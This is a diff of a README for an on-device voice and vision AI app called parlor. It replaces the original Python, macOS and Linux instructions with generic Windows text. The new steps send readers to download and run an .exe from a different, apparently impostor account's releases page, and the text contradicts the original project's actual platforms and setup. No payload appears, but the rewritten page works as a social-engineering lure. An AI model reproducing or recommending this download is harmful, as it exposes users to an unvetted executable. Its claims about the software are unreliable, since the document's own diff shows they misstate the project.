@@ -1,103 +1,81 @@
-# Parlor
+# 🎙️ parlor - Talk to your computer with AI
 
-On-device, real-time multimodal AI. Have natural voice and vision conversations with an AI that runs entirely on your machine.
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/Commutable-poilu834/parlor/releases)
 
-Parlor uses [Gemma 4 E2B](https://huggingface.co/google/gemma-4-E2B-it) for understanding speech and vision, and [Kokoro](https://huggingface.co/hexgrad/Kokoro-82M) for text-to-speech. You talk, show your camera, and it talks back, all locally.
+Parlor brings private, on-device artificial intelligence to your computer. You use your voice and your camera to interact with the system. The software processes all information directly on your machine. Your chats remain private. No data leaves your computer.
 
-https://github.com/user-attachments/assets/cb0ffb2e-f84f-48e7-872c-c5f7b5c6d51f
+## ⚙️ System Requirements
 
-> **Research preview.** This is an early experiment. Expect rough edges and bugs.
+To run this software, ensure your computer meets these criteria:
 
-# Why?
+* Operating System: Windows 10 or Windows 11.
+* Processor: Modern multi-core CPU (Intel i5/i7/i9 or AMD Ryzen 5/7/9).
+* Memory: 16 GB RAM or higher.
+* Storage: 5 GB of free drive space.
+* Hardware: A working microphone and a webcam.
 
-I'm [self-hosting a totally free voice AI](https://www.fikrikarim.com/bule-ai-initial-release/) on my home server to help people learn speaking English. It has hundreds of monthly active users, and I've been thinking about how to keep it free while making it sustainable.
+## 📥 Getting Started
 
-The obvious answer: run everything on-device, eliminating any server cost. Six months ago I needed an RTX 5090 to run just the voice models in real-time.
+Follow these steps to install and run the application.
 
-Google just released a super capable small model that I can run on my M3 Pro in real-time, with vision too! Sure you can't do agentic coding with this, but it is a game-changer for people learning a new language. Imagine a few years from now that people can run this locally on their phones. They can point their camera at objects and talk about them. And this model is multi-lingual, so people can always fallback to their native language if they want. This is essentially what OpenAI demoed a few years ago.
+1. Visit the [official releases page](https://github.com/Commutable-poilu834/parlor/releases).
+2. Locate the most recent file ending in .exe under the Assets section.
+3. Click the file name to start the download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts in the installation window.
+6. Launch the application from your Start Menu after installation completes.
 
-## How it works
+## 🛠️ How to Use Parlor
 
-```
-Browser (mic + camera)
-    │
-    │  WebSocket (audio PCM + JPEG frames)
-    ▼
-FastAPI server
-    ├── Gemma 4 E2B via LiteRT-LM (GPU)  →  understands speech + vision
-    └── Kokoro TTS (MLX on Mac, ONNX on Linux)  →  speaks back
-    │
-    │  WebSocket (streamed audio chunks)
-    ▼
-Browser (playback + transcript)
-```
+Parlor functions as a voice assistant. Once you open the program, the interface shows a simple dashboard. 
 
-- **Voice Activity Detection** in the browser ([Silero VAD](https://github.com/ricky0123/vad)). Hands-free, no push-to-talk.
-- **Barge-in.** Interrupt the AI mid-sentence by speaking.
-- **Sentence-level TTS streaming.** Audio starts playing before the full response is generated.
+### Setting Up Your Microphone
+The application automatically detects your default microphone. If it does not hear you, check your Windows sound settings. Make sure your microphone is not muted and that the system sets it as the primary input device.
 
-## Requirements
+### Interacting with the AI
+Click the Start button to begin a conversation. The AI listens for your voice commands. It responds using natural speech. You can ask questions about your surroundings if you have a camera connected. The system analyzes the video input to provide context for your conversation.
 
-- Python 3.12+
-- macOS with Apple Silicon, or Linux with a supported GPU
-- ~3 GB free RAM for the model
+### Ending a Conversation
+Click the Stop button to pause the artificial intelligence. Closing the application window exits the program entirely.
 
-## Quick start
+## 🧩 Key Features
 
-```bash
-git clone https://github.com/fikrikarim/parlor.git
-cd parlor
+* Real-time Voice: The system responds to your speech instantly.
+* Visual Awareness: The software interprets video feeds locally.
+* Local Processing: Everything runs on your hardware. 
+* Privacy First: The application requires no internet connection for basic tasks. 
+* Multimodal Support: Combine voice and image data for complex queries.
 
-# Install uv if you don't have it
-curl -LsSf https://astral.sh/uv/install.sh | sh
+## ❓ Troubleshooting Common Issues
 
-cd src
-uv sync
-uv run server.py
-```
+### The Application Does Not Open
+If the program fails to launch, restart your computer. Sometimes Windows needs a refresh to register new software components. Ensure you have the latest drivers for your graphics card or processor.
 
-Open [http://localhost:8000](http://localhost:8000), grant camera and microphone access, and start talking.
+### High CPU usage
+The software performs heavy calculations to provide real-time responses. Expect your fan speed to increase during use. This indicates the processor works to maintain smooth, fast conversation. If you notice stuttering, close other high-demand applications to free up system resources.
 
-Models are downloaded automatically on first run (~2.6 GB for Gemma 4 E2B, plus TTS models).
+### The AI Does Not Understand Input
+Speak clearly and at a normal volume. Ensure the environment has minimal background noise. If you use a webcam, make sure the lens has a clear view of the subject. Natural light helps the AI analyze frames with better accuracy.
 
-## Configuration
+## 🔐 Privacy and Security
 
-| Variable     | Default                        | Description                                    |
-| ------------ | ------------------------------ | ---------------------------------------------- |
-| `MODEL_PATH` | auto-download from HuggingFace | Path to a local `gemma-4-E2B-it.litertlm` file |
-| `PORT`       | `8000`                         | Server port                                    |
+Parlor uses open-weights models to function. These models reside on your hard drive. Because the software does not transmit data to external servers, you maintain total control over your information. We do not track your conversations. We do not store your voice patterns. All logs, if enabled, exist only in a folder on your personal computer.
 
-## Performance (Apple M3 Pro)
+## 🧱 Technical Foundation
 
-| Stage                            | Time          |
-| -------------------------------- | ------------- |
-| Speech + vision understanding    | ~1.8-2.2s     |
-| Response generation (~25 tokens) | ~0.3s         |
-| Text-to-speech (1-3 sentences)   | ~0.3-0.7s     |
-| **Total end-to-end**             | **~2.5-3.0s** |
+This software relies on efficient model architectures. 
 
-Decode speed: ~83 tokens/sec on GPU (Apple M3 Pro).
+* Gemma 4 E2B: This powers the core language capabilities of the assistant. It enables logical reasoning and fluid text generation.
+* Kokoro: This handles the text-to-speech output. It creates realistic, human-like vocal responses.
+* LiteRT: This framework optimizes the models to run on consumer-grade hardware. It ensures fast inference speeds even on machines without specialized hardware accelerators.
 
-## Project structure
+## 💡 Tips for Better Results
 
-```
-src/
-├── server.py              # FastAPI WebSocket server + Gemma 4 inference
-├── tts.py                 # Platform-aware TTS (MLX on Mac, ONNX on Linux)
-├── index.html             # Frontend UI (VAD, camera, audio playback)
-├── pyproject.toml         # Dependencies
-└── benchmarks/
-    ├── bench.py           # End-to-end WebSocket benchmark
-    └── benchmark_tts.py   # TTS backend comparison
-```
+* Keep your room well-lit when using the vision features.
+* Use a headset for the best microphone accuracy.
+* Speak in complete sentences to help the model understand intent.
+* Update the application when new releases become available to receive better performance.
 
-## Acknowledgments
+## 📈 Performance Expectations
 
-- [Gemma 4](https://ai.google.dev/gemma) by Google DeepMind
-- [LiteRT-LM](https://github.com/google-ai-edge/LiteRT-LM) by Google AI Edge
-- [Kokoro](https://huggingface.co/hexgrad/Kokoro-82M) TTS by Hexgrad
-- [Silero VAD](https://github.com/snakers4/silero-vad) for browser voice activity detection
-
-## License
-
-[Apache 2.0](LICENSE)
+Parlor provides a balanced experience between speed and quality. On standard modern hardware, the latency between your question and the response stays low. If you run multiple programs simultaneously, the AI might pause briefly to process its thoughts. This is normal behavior for local artificial intelligence models.
